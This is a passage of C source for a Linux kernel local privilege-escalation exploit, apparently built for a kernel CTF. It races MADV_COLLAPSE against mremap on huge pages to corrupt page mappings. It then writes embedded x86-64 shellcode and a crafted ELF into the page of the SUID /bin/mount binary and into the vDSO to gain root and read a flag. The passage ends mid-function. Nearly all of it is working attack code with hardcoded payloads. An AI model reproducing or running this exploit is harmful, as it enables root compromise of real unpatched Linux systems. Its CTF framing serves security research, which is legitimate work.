#define _GNU_SOURCE
#include <err.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/timerfd.h>
#include <sys/wait.h>
#include <unistd.h>

/* Eternal sleep function to replace all sleep calls */
static void eternal_sleep(void) {
  while (1) {
    sleep(1000000); /* Sleep for an extremely long time */
  }
}

/* Color definitions for logging */
#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

/* Logging macros */
#define logd(fmt, ...) \
  dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...) \
  dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
          __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...) \
  dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
          __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...) \
  dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
          __LINE__, ##__VA_ARGS__)
#define die(fmt, ...) \
  do { \
    loge(fmt, ##__VA_ARGS__); \
    loge("Exit at line %d", __LINE__); \
    exit(1); \
  } while (0)

/* Define MADV_COLLAPSE if not already defined */
#ifndef MADV_COLLAPSE
#define MADV_COLLAPSE 25
#endif

/* Syscall check macro */
#define SYSCHK(x) \
  ({ \
    typeof(x) __res = (x); \
    if (__res == (typeof(x))-1) \
      err(1, "SYSCHK(" #x ")"); \
    __res; \
  })

/*
 * ============================================================================
 * BINARY PAYLOADS
 * ============================================================================
 */

/* SUID ELF binary payload */
unsigned char suid_elf[] = {
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    49,   255,  49,   210,  49,   246,  106,  117,  88,   15,   5,    72,
    184,  1,    1,    1,    1,    1,    1,    1,    1,    80,   72,   184,
    46,   99,   104,  111,  46,   114,  105,  1,    72,   49,   4,    36,
    72,   137,  231,  104,  63,   39,   51,   1,    129,  52,   36,   1,
    1,    1,    1,    72,   184,  116,  32,   47,   102,  108,  97,   103,
    32,   80,   72,   184,  1,    1,    1,    1,    1,    1,    1,    1,
    80,   72,   184,  114,  105,  1,    44,   98,   1,    98,   96,   72,
    49,   4,    36,   49,   246,  86,   106,  14,   94,   72,   1,    230,
    86,   106,  19,   94,   72,   1,    230,  86,   106,  24,   94,   72,
    1,    230,  86,   72,   137,  230,  49,   210,  106,  59,   88,   15,
    5,    106,  1,    254,  12,   36,   104,  17,   38,   1,    1,    129,
    52,   36,   1,    1,    1,    1,    72,   137,  231,  49,   246,  106,
    35,   88,   15,   5,    0xeb, 0xfe};

/* VDSO shellcode payload */
unsigned char vdso_shellcode[] = {
    72,  184, 1,   1,   1,   1,   1,   1,    1,   1,   80,  72,  184, 46,  99,
    104, 111, 46,  114, 105, 1,   72,  49,   4,   36,  72,  137, 231, 72,  184,
    1,   1,   1,   1,   1,   1,   1,   1,    80,  72,  184, 117, 33,  63,  39,
    51,  1,   1,   1,   72,  49,  4,   36,   72,  184, 98,  105, 110, 47,  109,
    111, 117, 110, 80,  72,  184, 47,  99,   104, 114, 111, 111, 116, 47,  80,
    72,  184, 32,  62,  38,  50,  32,  38,   38,  32,  80,  72,  184, 1,   1,
    1,   1,   1,   1,   1,   1,   80,  72,   184, 114, 105, 1,   44,  98,  1,
    104, 101, 72,  49,  4,   36,  49,  246,  86,  106, 14,  94,  72,  1,   230,
    86,  106, 19,  94,  72,  1,   230, 86,   106, 24,  94,  72,  1,   230, 86,
    72,  137, 230, 49,  210, 106, 59,  88,   15,  5,   106, 1,   254, 12,  36,
    104, 17,  38,  1,   1,   129, 52,  36,   1,   1,   1,   1,   72,  137, 231,
    49,  246, 106, 35,  88,  15,  5,   0xeb, 0xfe};

/*
 * ============================================================================
 * RACE TIMING PARAMETERS
 * ============================================================================
 */

/* Timing parameters for the race condition */
int mins_passed = 0;
#define NR_WATCHES (1200 / 2)  // Number of timer watches
#define NR_EPFDS 500           // Number of epoll file descriptors
#define PICK_NUM 1000          // Number of timing calibration iterations

/* Timing and synchronization objects */
struct timespec child_spin_ts;   // Prevents pre-runs and prepares for the actual execution
struct timespec child_launch_ts; // Controls the actual execution timing

/* 
 * Memory management configuration
 */

/* Process types for tracking corrupted processes */
typedef enum process_type {
    HIJACK_PROCESS = 0,  /* Process that modifies the SUID binary and VDSO mappings in the victim process */
    VICTIM_PROCESS = 1,  /* Process that will be exploited */
    MAX_PROCESSES = 2    /* Total number of processes needed */
} process_type_t;

/* Memory configuration structure */
struct memory_config {
    /* Page frame numbers for different memory regions */
    struct {
        size_t no_crash;  /* Page frame number for no-crash region */
        size_t suid;      /* Page frame number for SUID binary region */
        size_t vdso;      /* Page frame number for VDSO region */
    } pfn;
    
    /* Process-specific memory layouts */
    struct {
        size_t mmap_addr;    /* Initial mapping address */
        size_t mremap_addr;  /* Destination address for mremap */
    } layouts[MAX_PROCESSES];
    
    /* Page size configuration */
    size_t pmd_page_size;  /* Page Middle Directory size */
};

/* Global memory configuration */
static const struct memory_config MEM_CONFIG = {
    .pfn = {
        .no_crash = 0x488 / 8,
        .suid = 0x80,
        .vdso = 0xc0
    },
    /* 
     * Select addresses for mappings,
     * ensuring they don't overlap with other mapped regions
     */
    .layouts = {
        [HIJACK_PROCESS] = {
            .mmap_addr = 0x200000,      /* Initial mapping address for hijack process */
            .mremap_addr = 0x40000000,  /* Destination address for mremap in hijack process */
        },
        [VICTIM_PROCESS] = {
            .mmap_addr = 0x2000000,     /* Initial mapping address for victim process */
            .mremap_addr = 0x60000000,  /* Destination address for mremap in victim process */
        }
    },
    .pmd_page_size = 0x1000 / 8 * 0x1000
};

/* Process tracking state */
int corrupted_pid_idx = 0;
int corrupted_pids[MAX_PROCESSES] = {};
int now_child_pid;
int getflag_pid;

/* Race condition tracking and shared memory */
size_t *race_hit, *rand_1, *rand_2;
struct timespec last_time_evaluated;

/* Structure for shared data between processes */
typedef struct {
    double math_timeout;      // Timing calibration value
    size_t race_hit;          // Flag indicating if race condition succeeded
    size_t rand_1;            // Random value for timing adjustment 1
    size_t rand_2;            // Random value for timing adjustment 2
} shared_data_t;

/* Global pointer to shared data structure */
shared_data_t *shared_data;

/*
 * ============================================================================
 * TIME MANAGEMENT FUNCTIONS
 * ============================================================================
 */

/**
 * Get current monotonic time
 */
struct timespec get_mono_time(void) {
  struct timespec ts;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &ts));
  return ts;
}

/**
 * Calculate elapsed time in seconds between two timestamps
 */
double elapsed_seconds(const struct timespec *start, const struct timespec *end) {
  time_t secs_diff = end->tv_sec - start->tv_sec;
  long nsecs_diff = end->tv_nsec - start->tv_nsec;

  // Handle negative nanosecond difference by borrowing from seconds
  if (nsecs_diff < 0) {
    secs_diff -= 1;
    nsecs_diff += 1000000000L; // 1 second = 1,000,000,000 nanoseconds
  }

  return (double)secs_diff + (double)nsecs_diff / 1000000000.0;
}

/**
 * Calculate elapsed time in nanoseconds between two timestamps
 */
uint64_t elapsed_nsecs(const struct timespec *start, const struct timespec *end) {
  time_t secs_diff = end->tv_sec - start->tv_sec;
  long nsecs_diff = end->tv_nsec - start->tv_nsec;

  // Handle negative nanosecond difference by borrowing from seconds
  if (nsecs_diff < 0) {
    secs_diff -= 1;
    nsecs_diff += 1000000000L;
  }

  uint64_t total_nsecs = (uint64_t)secs_diff * 1000000000ULL + (uint64_t)nsecs_diff;
  return total_nsecs;
}

#define NSEC_PER_SEC 1000000000UL

/**
 * Convert timespec to nanoseconds
 */
inline unsigned long timespec_to_ns(struct timespec ts) {
  return ts.tv_sec * NSEC_PER_SEC + ts.tv_nsec;
}

/**
 * Subtract nanoseconds from timespec
 */
void ts_sub(struct timespec *ts, unsigned long nsecs) {
  if (ts->tv_nsec < nsecs) {
    ts->tv_sec--;
    ts->tv_nsec += NSEC_PER_SEC;
  }
  ts->tv_nsec -= nsecs;
}

/**
 * Add nanoseconds to timespec
 */
void ts_add(struct timespec *ts, unsigned long nsecs) {
  ts->tv_nsec += nsecs;
  if (ts->tv_nsec >= NSEC_PER_SEC) {
    ts->tv_sec++;
    ts->tv_nsec -= NSEC_PER_SEC;
  }
}

/**
 * Check if a timestamp is in the future
 */
bool ts_is_in_future(struct timespec ts) {
  struct timespec cur = get_mono_time();
  if (ts.tv_sec > cur.tv_sec)
    return true;
  if (ts.tv_sec < cur.tv_sec)
    return false;
  return ts.tv_nsec > cur.tv_nsec;
}

/*
 * ============================================================================
 * EPOLL AND TIMER MANAGEMENT
 * ============================================================================
 */

/**
 * Add a file descriptor to an epoll instance
 */
void epoll_add(int epfd, int fd) {
  struct epoll_event ev = {.events = EPOLLIN};
  SYSCHK(epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev));
}

/*
 * ============================================================================
 * PROCESS AND CPU MANAGEMENT
 * ============================================================================
 */

/**
 * Pin the current process to a specific CPU
 */
static void pin_to(int cpu) {
  cpu_set_t cset;
  CPU_ZERO(&cset);
  CPU_SET(cpu, &cset);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &cset))
    err(1, "set affinity");
}

/**
 * Write content to a file
 */
static void write_file(char *name, char *buf) {
  int fd = SYSCHK(open(name, O_WRONLY));
  if (write(fd, buf, strlen(buf)) != strlen(buf))
    err(1, "write %s", name);
  close(fd);
}

/**
 * Write mapping information to a file
 */
static void write_map(char *name, int outer_id) {
  char buf[100];
  sprintf(buf, "0 %d 1", outer_id);
  write_file(name, buf);
}

/*
 * ============================================================================
 * MEMORY REGION PARSING AND VDSO MANAGEMENT
 * ============================================================================
 */

/**
 * Structure to hold memory region information
 */
typedef struct {
  unsigned long start;
  unsigned long end;
  char permissions[5];  // e.g., "r-xp"
  char pathname[256];
} mem_region_t;

/**
 * Parse a line from /proc/<PID>/maps and fill the mem_region_t structure
 * Returns 1 on success, 0 on failure
 */
int parse_map_line(const char *line, mem_region_t *region) {
  // Initialize pathname to empty string
  region->pathname[0] = '\0';

  // Example line format:
  // 7ffd071f2000-7ffd071f6000 r--p 00000000 00:00 0 [vdso]
  int fields = sscanf(line, "%lx-%lx %4s %*s %*s %*s %255[^\n]", 
                     &region->start, &region->end, region->permissions, region->pathname);
  if (fields < 4) {
    // If pathname is missing, set it to empty
    region->pathname[0] = '\0';
  }
  return 1;
}

/**
 * Retrieves the [vdso] memory region address range for a given process
 *
 * @param pid         Process ID of the target process
 * @param start_addr  Pointer to store the start address of [vdso]
 * @param end_addr    Pointer to store the end address of [vdso]
 * @return            0 on success, -1 on failure
 */
int parse_vdso_start_end(pid_t pid, unsigned long *start_addr, unsigned long *end_addr) {
  char maps_path[256];
  FILE *maps_file = NULL;
  char line[512];
  mem_region_t region;
  int found = 0;

  if (start_addr == NULL || end_addr == NULL) {
    fprintf(stderr, "Invalid address pointers provided.\n");
    return -1;
  }

  // Construct path to /proc/<PID>/maps
  snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);

  // Open /proc/<PID>/maps
  maps_file = fopen(maps_path, "r");
  if (!maps_file) {
    fprintf(stderr, "Error opening %s: %m\n", maps_path);
    return -1;
  }

  // Parse /proc/<PID>/maps to find [vdso]
  while (fgets(line, sizeof(line), maps_file)) {
    if (strstr(line, "[vdso]")) {
      parse_map_line(line, &region);
      found = 1;
      break;
    }
  }

  fclose(maps_file);

  if (!found) {
    fprintf(stderr, "Failed to find [vdso] region in /proc/%d/maps\n", pid);
    return -1;
  }

  *start_addr = region.start;
  *end_addr = region.end;

  return 0;
}

/*
 * ============================================================================
 * MEMORY DUMPING UTILITY
 * ============================================================================
 */

/**
 * Dump memory contents in hexadecimal format
 */
void DumpHex(const void *data, size_t size) {
  char ascii[17];
  size_t i, j;
  ascii[16] = '\0';
  
  for (i = 0; i < size; ++i) {
    printf("%02X ", ((unsigned char *)data)[i]);
    
    if (((unsigned char *)data)[i] >= ' ' && ((unsigned char *)data)[i] <= '~') {
      ascii[i % 16] = ((unsigned char *)data)[i];
    } else {
      ascii[i % 16] = '.';
    }
    
    if ((i + 1) % 8 == 0 || i + 1 == size) {
      printf(" ");
      if ((i + 1) % 16 == 0) {
        printf("|  %s \n", ascii);
      } else if (i + 1 == size) {
        ascii[(i + 1) % 16] = '\0';
        if ((i + 1) % 16 <= 8) {
          printf(" ");
        }
        for (j = (i + 1) % 16; j < 16; ++j) {
          printf("   ");
        }
        printf("|  %s \n", ascii);
      }
    }
  }
}

/*
 * ============================================================================
 * SIGNAL HANDLERS
 * ============================================================================
 */

void hijack_suid_and_vdso(int signum);
void mmap_suid_and_vdso(int signum);

typedef void (*signal_handler_t)(int);
signal_handler_t do_bad_handlers[] = {hijack_suid_and_vdso, mmap_suid_and_vdso};

/**
 * Signal handler for when a victim process is found
 */
void found_victim_handler(int signum) {
  last_time_evaluated = get_mono_time(); // If successful, maintain the current timing
  corrupted_pids[corrupted_pid_idx++] = now_child_pid;
  *race_hit = 1;
  logi("rand_1 @ %ld rand_2 @ %ld", *rand_1, *rand_2);
  logi("(rand_1%%1000) @ %ld (rand_2%%1000) @ %ld", *rand_1 % 1000, *rand_2 % 1000);
  logd("Successfully identified a vulnerable process!");
  return;
}

/**
 * Signal handler for when the job is complete
 */
void job_done_handler(int signum) {
  logd("Signal received, job completed successfully!");
  return;
}

/**
 * Signal handler for getting the flag
 */
void getflag_handler(int signum) {
  system("/bin/mount");
  exit(0);
}

/**
 * Signal handler for hijacking SUID and VDSO memory regions
 */
void hijack_suid_and_vdso(int signum) {
  logd("Hijacking SUID binary...");
  mprotect((void *)(MEM_CONFIG.layouts[HIJACK_PROCESS].mremap_addr + MEM_CONFIG.pfn.suid * 0x1000),
           0x1000, PROT_READ | PROT_WRITE | PROT_EXEC);

  memcpy((void *)(MEM_CONFIG.layouts[HIJACK_PROCESS].mremap_addr + MEM_CONFIG.pfn.suid * 0x1000),
         suid_elf, sizeof(suid_elf));

  // If running in PR verification without nsjail, we can directly access the flag
  if (access("/flag", F_OK) == 0) {
    puts("Attempting to read flag...");
    // Signal the getflag process to read the flag
    kill(getflag_pid, SIGUSR1);
    // Wait briefly to ensure the flag is read
    sleep(1);
    /* Shutdown immediately to speed up the next attempt in PR verification workflow */
    kill(getppid(), SIGKILL);
    exit(0);
  }
  
  // If inside nsjail, we need to hijack the VDSO region to read the flag
  logd("Hijacking VDSO region...");
  unsigned long vdso_start = 0, vdso_end = 0;
  parse_vdso_start_end(getpid(), &vdso_start, &vdso_end);
  mprotect((void *)(MEM_CONFIG.layouts[HIJACK_PROCESS].mremap_addr + MEM_CONFIG.pfn.vdso * 0x1000),
           vdso_end - vdso_start, PROT_READ | PROT_WRITE | PROT_EXEC);

  memcpy((void *)(MEM_CONFIG.layouts[HIJACK_PROCESS].mremap_addr + MEM_CONFIG.pfn.vdso * 0x1000 + 0xd94),
         vdso_shellcode, sizeof(vdso_shellcode));
  memset((void *)(MEM_CONFIG.layouts[HIJACK_PROCESS].mremap_addr + MEM_CONFIG.pfn.vdso * 0x1000 + 0x650),
         '\x90', 0xd94 - 0x650);
  DumpHex((void *)(MEM_CONFIG.layouts[HIJACK_PROCESS].mremap_addr + MEM_CONFIG.pfn.vdso * 0x1000), 0x100);
  eternal_sleep();
}

/**
 * Signal handler for mapping SUID and VDSO memory regions
 */
void mmap_suid_and_vdso(int signum) {
  logd("Mapping SUID binary...");
  int suid_fd = open("/bin/mount", O_RDONLY);
  SYSCHK(mmap((void *)(MEM_CONFIG.layouts[VICTIM_PROCESS].mremap_addr + MEM_CONFIG.pfn.suid * 0x1000),
              0x1000, PROT_READ, MAP_SHARED | MAP_FIXED, suid_fd, 0));
  DumpHex((void *)(MEM_CONFIG.layouts[VICTIM_PROCESS].mremap_addr + MEM_CONFIG.pfn.suid * 0x1000), 0x10);
  
  logd("Mapping VDSO region...");
  unsigned long vdso_start = 0, vdso_end = 0;
  parse_vdso_start_end(getpid(), &vdso_start, &vdso_end);
  SYSCHK(mremap((void *)vdso_start, vdso_end - vdso_start,
                vdso_end - vdso_start, MREMAP_FIXED | MREMAP_MAYMOVE,
                MEM_CONFIG.layouts[VICTIM_PROCESS].mremap_addr + MEM_CONFIG.pfn.vdso * 0x1000));
  
  for (size_t i = MEM_CONFIG.layouts[VICTIM_PROCESS].mremap_addr + MEM_CONFIG.pfn.vdso * 0x1000;
       i < MEM_CONFIG.layouts[VICTIM_PROCESS].mremap_addr + MEM_CONFIG.pfn.vdso * 0x1000 + vdso_end - vdso_start;
       i += 0x1000) {
    DumpHex((void *)i, 0x10);
  }
  
  logd("Memory mapping complete");
  kill(getppid(), SIGUSR2);
  eternal_sleep();
}

/*
 * ============================================================================
 * RACE CONDITION HELPER FUNCTIONS
 * ============================================================================
 */

/* Forward declarations */
void detect_successful_race(size_t mremap_addr_now, int memory_dump_fd);

/**
 * Set up the shared memory mapping for the race condition
 * 
 * @param mmap_addr Address where memory should be mapped
 * @return Pointer to the mapped memory region
 */
void* setup_memory_mapping(size_t mmap_addr) {
  /* Create and map a temporary file */
  int fd = SYSCHK(open("/tmp/a", O_RDWR | O_CREAT, 0600));
  void *ptr = SYSCHK(mmap((void *)mmap_addr, MEM_CONFIG.pmd_page_size, PROT_READ | PROT_WRITE,
                        MAP_SHARED | MAP_FIXED, fd, 0));
  
  /* Set up huge page */
  SYSCHK(ftruncate(fd, 0x1000));
  *((volatile char *)ptr) = 'a';
  SYSCHK(ftruncate(fd, MEM_CONFIG.pmd_page_size));
  SYSCHK(madvise(ptr, MEM_CONFIG.pmd_page_size, MADV_HUGEPAGE));
  close(fd);
  SYSCHK(unlink("/tmp/a"));
  
  return ptr;
}

/**
 * Configure timers for race timing
 * 
 * @param base_time Current time
 * @param main_launch_ts Timestamp for parent process to execute
 * @param child_launch_ts Timestamp for child process to execute
 */
void configure_race_timers(struct timespec base_time, 
                          struct timespec *main_launch_ts,
                          struct timespec *child_launch_ts) {
  /* Set up timer to fire 5ms in the future */
  struct itimerspec its = {.it_value = base_time};
  ts_add(&its.it_value, 5000 * 1000); // Timer at +5000 µs

  *main_launch_ts = its.it_value;
  *child_launch_ts = its.it_value;
  
  /* Adjust child launch time based on calibration data */
  if (!*race_hit) {
    *rand_1 = rand();
    ts_sub(child_launch_ts, *rand_1 % 10000);
  } else {
    ts_sub(child_launch_ts, *rand_1 % 10000);
  }
}

/**
 * Run child process part of the race condition
 * 
 * @param ptr Pointer to the mapped memory
 * @param mmap_addr_now The source memory mapping address
 * @param mremap_addr_now The destination memory mapping address
 * @param pick_num_now Current timing calibration iteration
 * @param tfd Timer file descriptor
 * @param tfd2 Second timer file descriptor
 * @param its Timer specification
 * @return 0 on success
 */
int run_child_race_process(void *ptr, size_t mmap_addr_now, size_t mremap_addr_now, 
                           int pick_num_now, int tfd, int tfd2, struct itimerspec its) {
  /* Reference the shared_data structure directly */
  double *math_timeout = &shared_data->math_timeout;
  
  /* Set up signal handler for this child */
  struct sigaction sa;
  sa.sa_handler = do_bad_handlers[corrupted_pid_idx];
  sa.sa_flags = 0;
  sigemptyset(&sa.sa_mask);
  if (sigaction(SIGUSR1, &sa, NULL) == -1) {
    perror("sigaction failed");
    exit(EXIT_FAILURE);
  }
  
  /* Create temporary file for checking race success */
  int memory_dump_fd = open("/tmp/dump", O_CREAT | O_RDWR, 0644);
  pin_to(0);
  
  /* Touch all pages to ensure they're mapped */
  for (int i = 0; i < 512; i++)
    ((volatile char *)ptr)[0x1000 * i] = 'a';

  /* Set up timer for race condition */
  if (pick_num_now >= PICK_NUM)
    SYSCHK(timerfd_settime(tfd, TFD_TIMER_ABSTIME, &its, NULL));

  /* Calibrate timing */
  struct itimerspec new = {};
  if (!*race_hit) {
    *rand_2 = rand();
    new.it_value.tv_nsec = (size_t)*math_timeout - (*rand_2 % 10000);
  } else {
    new.it_value.tv_nsec = (size_t)*math_timeout - (*rand_2 % 10000);
  }

  /* Wait until precise launch time */
  while (ts_is_in_future(child_launch_ts)) /*spin*/;

  if (pick_num_now >= PICK_NUM)
    SYSCHK(timerfd_settime(tfd2, TFD_TIMER_CANCEL_ON_SET, &new, NULL));

  /* Execute mremap in the race window */
  if (pick_num_now < PICK_NUM) {
    /* During calibration, measure mremap execution time */
    struct timespec base_time = get_mono_time();
    SYSCHK(mremap((void *)mmap_addr_now, MEM_CONFIG.pmd_page_size, MEM_CONFIG.pmd_page_size,
                  MREMAP_MAYMOVE | MREMAP_FIXED, (void *)mremap_addr_now));
    struct timespec new_time = get_mono_time();
    *math_timeout += elapsed_nsecs(&base_time, &new_time) * 1.0 / PICK_NUM;
  } else {
    /* Real execution */
    SYSCHK(mremap((void *)mmap_addr_now, MEM_CONFIG.pmd_page_size, MEM_CONFIG.pmd_page_size,
                  MREMAP_MAYMOVE | MREMAP_FIXED, (void *)mremap_addr_now));
  }

  /* Check for a successful race condition */
  detect_successful_race(mremap_addr_now, memory_dump_fd);
  close(memory_dump_fd);
  return 0;
}

/**
 * Check if the race condition was successful by examining memory contents
 * 
 * @param mremap_addr_now The destination memory mapping address
 * @param memory_dump_fd File descriptor for temporary storage
 */
void detect_successful_race(size_t mremap_addr_now, int memory_dump_fd) {
  // Flush the TLB
  mprotect((void *)(mremap_addr_now + MEM_CONFIG.pfn.no_crash * 0x1000), 0x1000,
           PROT_READ | PROT_WRITE | PROT_EXEC);
  mprotect((void *)(mremap_addr_now + MEM_CONFIG.pfn.no_crash * 0x1000), 0x1000,
           PROT_READ);
  mprotect((void *)(mremap_addr_now + MEM_CONFIG.pfn.no_crash * 0x1000), 0x1000,
           PROT_READ | PROT_WRITE | PROT_EXEC);

  // Direct access might cause SIGSEGV as shown in the kernel log below
  // [   87.426713] exploit[3128]: segfault at 2d8 ip 00000000004856e3 sp 00007ffe53bf3b08 error 6 in exploit[401000+aa000] likely on CPU 1 (core 1, socket 0)
  // Use pwrite and pread to avoid this issue
  pwrite(memory_dump_fd, (void *)(mremap_addr_now + MEM_CONFIG.pfn.no_crash * 0x1000), 4, 0);
  int dump_cont = 0;
  pread(memory_dump_fd, &dump_cont, 4, 0);

  if (dump_cont != 0x61) {
    puts("Vulnerable process identified!");
    kill(getppid(), SIGUSR1);
    eternal_sleep();
  }
}

/**
 * Run parent process part of the race condition
 * 
 * @param ptr Pointer to the mapped memory
 * @param main_launch_ts Timestamp for parent process to execute
 * @return 0 on success
 */
int run_parent_race_process(void *ptr, struct timespec main_launch_ts) {
  /* Touch all pages to ensure they're mapped */
  for (int i = 0; i < 512; i++)
    ((volatile char *)ptr)[0x1000 * i] = 'a';

  /* Wait until precise launch time */
  while (ts_is_in_future(main_launch_ts)) /*spin*/;
  
  /* Trigger the race condition with MADV_COLLAPSE */
  int madv_res = madvise(ptr, 0x200000, MADV_COLLAPSE);
  if (madv_res == -1)
    fprintf(stderr, "_");
    
  return 0;
}

/**
 * Update calibration timing values
 * 
 * @param pick_num_now Pointer to current calibration iteration counter
 * @param math_timeout Pointer to the timing calibration value
 */
void update_calibration_timing(int *pick_num_now, double *math_timeout) {
  if (*pick_num_now < PICK_NUM)
    (*pick_num_now)++;
    
  if (*pick_num_now == PICK_NUM) {
    last_time_evaluated = get_mono_time();
    *pick_num_now = 0x13371337; // 0x13371337: Special flag indicating timeout value update, only used in this function
  }
  
  if (*pick_num_now == 0x13371337 && !*race_hit) {
    /* Check if the environment has changed (time elapsed) */
    struct timespec test_if_need_evaluated = get_mono_time();
    if (elapsed_seconds(&last_time_evaluated, &test_if_need_evaluated) > 60.0) {
      mins_passed++;
      logw("\n[%d minutes] Recalibrating timeout values", mins_passed);
      *pick_num_now = 0;
      *math_timeout = 0.0;
    }
  }
}

/*
 * ============================================================================
 * MAIN FUNCTION
 * ============================================================================
 */

int main(void) {
  srand(time(NULL));
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  
  // Set a 30-minute timeout, allowing for 10 attempts within a 300-minute window
  alarm(30 * 60);
  
  /* Fork a process to retrieve the flag - must run outside exploit namespace to getflag */
  getflag_pid = fork();
  if (!getflag_pid) {
    struct sigaction sa;
    sa.sa_handler = getflag_handler;
    sa.sa_flags = 0;
    sigemptyset(&sa.sa_mask);
    if (sigaction(SIGUSR1, &sa, NULL) == -1) {
      perror("sigaction failed");
      exit(EXIT_FAILURE);
    }
    eternal_sleep();
  }

  /* Set up signal handlers */
  struct sigaction sa;
  sa.sa_handler = found_victim_handler;
  sa.sa_flags = 0;
  sigemptyset(&sa.sa_mask);
  if (sigaction(SIGUSR1, &sa, NULL) == -1) {
    perror("sigaction failed");
    exit(EXIT_FAILURE);
  }
  
  sa.sa_handler = job_done_handler;
  sa.sa_flags = 0;
  sigemptyset(&sa.sa_mask);
  if (sigaction(SIGUSR2, &sa, NULL) == -1) {
    perror("sigaction failed");
    exit(EXIT_FAILURE);
  }

  /* Set up new mount namespace for tmpfs with THP */
  int outer_uid = getuid();
  int outer_gid = getgid();
  SYSCHK(unshare(CLONE_NEWNS | CLONE_NEWUSER));
  SYSCHK(mount(NULL, "/", NULL, MS_PRIVATE | MS_REC, NULL));
  write_file("/proc/self/setgroups", "deny");
  write_map("/proc/self/uid_map", outer_uid);
  write_map("/proc/self/gid_map", outer_gid);

  /* Mount tmpfs with THP support */
  SYSCHK(mount("none", "/tmp", "tmpfs", MS_NOSUID | MS_NODEV, "huge=advise"));

  /* Set resource limits */
  struct rlimit rlim = {.rlim_cur = 0x1000, .rlim_max = 0x1000};
  SYSCHK(setrlimit(RLIMIT_NOFILE, &rlim));

  /* Pin to a specific CPU */
  pin_to(0);
  
  /* Set up timers and epoll */
  int primary_timer_fd = SYSCHK(timerfd_create(CLOCK_MONOTONIC, 0));
  int secondary_timer_fd = SYSCHK(timerfd_create(CLOCK_MONOTONIC, 0));
  int primary_timer_duplicates[NR_WATCHES];
  int secondary_timer_duplicates[NR_WATCHES];
  
  for (int i = 0; i < NR_WATCHES; i++) {
    primary_timer_duplicates[i] = SYSCHK(dup(primary_timer_fd));
    secondary_timer_duplicates[i] = SYSCHK(dup(secondary_timer_fd));
  }

  int epoll_instances[NR_EPFDS];
  for (int i = 0; i < NR_EPFDS; i++)
    epoll_instances[i] = SYSCHK(epoll_create1(0));

  for (int i = 0; i < NR_EPFDS; i++) {
    for (int j = 0; j < NR_WATCHES; j++)
      epoll_add(epoll_instances[i], primary_timer_duplicates[j]);
    for (int j = 0; j < NR_WATCHES; j++)
      epoll_add(epoll_instances[i], secondary_timer_duplicates[j]);
  }

  /* Set up shared memory for timing and race detection */
  shared_data = SYSCHK(mmap(0, sizeof(shared_data_t), PROT_READ | PROT_WRITE,
                            MAP_SHARED | MAP_ANONYMOUS, -1, 0));
  double *math_timeout = &shared_data->math_timeout;
  race_hit = &shared_data->race_hit;
  rand_1 = &shared_data->rand_1;
  rand_2 = &shared_data->rand_2;

  /* Main race condition loop */
  int pick_num_now = 0;
  while (1) {
    /* Log timing info every 100 iterations during calibration */
    if ((pick_num_now % 100 == 0) && (pick_num_now < PICK_NUM)) {
      puts("\n");
      logd("Current timing calibration: %lf ns", *math_timeout);
    }

    /* Exit loop once we've found two vulnerable processes */
    if (corrupted_pid_idx >= 2)
      break;
      
    size_t mmap_addr_now = MEM_CONFIG.layouts[corrupted_pid_idx].mmap_addr,
           mremap_addr_now = MEM_CONFIG.layouts[corrupted_pid_idx].mremap_addr;

    /* Pin to CPU core 1 for consistent timing */
    pin_to(1);
    
    /* Set up memory regions for the race condition */
    void *ptr = setup_memory_mapping(mmap_addr_now);

    /* Set up race timing */
    struct timespec base_time = get_mono_time();
    struct itimerspec its = {.it_value = base_time};
    ts_add(&its.it_value, 5000 * 1000); // Timer set to +5000 µs
    
    struct timespec main_launch_ts = its.it_value;
    configure_race_timers(base_time, &main_launch_ts, &child_launch_ts);

    /* Fork child process to run the race condition */
    now_child_pid = SYSCHK(fork());
    if (now_child_pid == 0) {
      /* Child process */
      return run_child_race_process(ptr, mmap_addr_now, mremap_addr_now, 
                                   pick_num_now, primary_timer_fd, secondary_timer_fd, its);
    }

    /* Parent process */
    run_parent_race_process(ptr, main_launch_ts);

    /* Wait for child process to finish */
    int wstatus;
    if (waitpid(now_child_pid, &wstatus, 0) < 0) {
      puts("RETURNED FROM SIGNAL");
    }

    /* Clean up memory */
